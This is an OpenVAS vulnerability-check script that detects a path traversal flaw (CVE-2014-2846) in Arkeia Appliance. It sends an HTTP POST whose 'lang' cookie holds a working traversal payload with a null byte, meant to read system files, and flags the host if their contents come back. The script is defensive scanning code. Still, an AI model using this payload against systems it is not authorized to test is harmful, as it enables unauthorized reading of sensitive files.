###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_arkeia_ava_traversal_04_14.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Arkeia Appliance Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:knox_software:arkeia_appliance";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105011");
  script_version("$Revision: 13994 $");
  script_cve_id("CVE-2014-2846");
  script_bugtraq_id(67039);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-04-23 13:16:06 +0200 (Wed, 23 Apr 2014)");
  script_name("Arkeia Appliance Path Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is running Arkeia Appliance and is affected by a path traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check is it possible to read
  a system file.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"insight", value:"Path traversal enables attackers access to files and directories outside the
  web root through relative file paths in the user input.");

  script_tag(name:"affected", value:"Arkeia Appliance Version 10.2.7 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.");

  script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140423-0_WD_Arkeia_Path_Traversal_v10.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_arkeia_virtual_appliance_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("ArkeiaAppliance/installed");
  script_require_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.arkeia.com/");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www") )
  exit( 0 );

if( ! get_app_location( port:port, cpe:CPE ) )
  exit( 0 );

files = traversal_files( "linux" );
vtstrings = get_vt_strings();
vtstring_lower = vtstrings["lowercase"];

host = http_host_name(port:port);

foreach pattern( keys( files ) ) {

  file = files[pattern];

  req = 'POST /login/doLogin HTTP/1.0\r\n' +
        'Host: ' + host + '\r\n' +
        'Cookie: lang=aaa..././..././..././..././..././..././' + file + '%00\r\n' +
        'Content-Length: 33\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        '\r\n' +
        'password=' + vtstring_lower + '&username=' + vtstring_lower;
  res = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( res && egrep( string:res, pattern:pattern ) ) {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );